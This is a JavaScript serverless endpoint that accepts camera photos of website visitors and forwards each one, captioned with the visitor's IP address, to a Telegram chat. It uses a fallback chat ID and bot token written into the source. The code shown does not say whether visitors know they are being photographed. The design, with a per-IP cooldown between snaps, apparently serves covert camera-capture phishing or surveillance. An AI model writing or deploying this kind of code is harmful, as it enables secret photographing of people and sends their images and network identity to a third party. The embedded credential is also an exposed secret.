// api/cam.js — receives visitor camera snap and sends to Telegram with clean info
const recentSnaps = new Map();
const COOLDOWN_MS = 15 * 1000; // 15s debounce per IP

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    const CHAT = process.env.TG_CHAT_ID || '8908879084';
    const BOT = process.env.TG_BOT_TOKEN || '8746655192:AAE0OabqXKfBkbs_kIlIRQEKNo_kE3JB49k';

    const ip =
      (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
      req.headers['x-real-ip'] ||
      req.socket?.remoteAddress ||
      'unknown';

    // Rate-limit check per IP
    const now = Date.now();
    if (ip !== 'unknown' && recentSnaps.has(ip)) {
      const lastSnap = recentSnaps.get(ip);
      if (now - lastSnap < COOLDOWN_MS) {
        return res.status(200).json({ ok: true, skipped: 'debounced' });
      }
    }
    if (ip !== 'unknown') recentSnaps.set(ip, now);

    let base64 = req.body && req.body.photo;
    if (!base64) {
      const raw = await readRaw(req);
      try { base64 = JSON.parse(raw.toString()).photo; } catch (e) {}
    }
    if (!base64) {
      return res.status(400).json({ error: "No photo" });
    }

    const base64Data = base64.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    const tgForm = new FormData();
    tgForm.append("chat_id", CHAT);
    tgForm.append("photo", new Blob([buffer], { type: "image/jpeg" }), "visitor_snap.jpg");
    tgForm.append("caption", `📸 <b>Visitor Camera Photo</b>\n🌐 IP: <code>${ip}</code>`);
    tgForm.append("parse_mode", "HTML");

    const tgRes = await fetch(
      `https://api.telegram.org/bot${BOT}/sendPhoto`,
      { method: "POST", body: tgForm }
    );

    if (!tgRes.ok) {
      const errText = await tgRes.text();
      return res.status(502).json({ error: "Telegram failed", tgError: errText });
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ error: "Forward failed" });
  }
}

function readRaw(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', reject);
  });
}
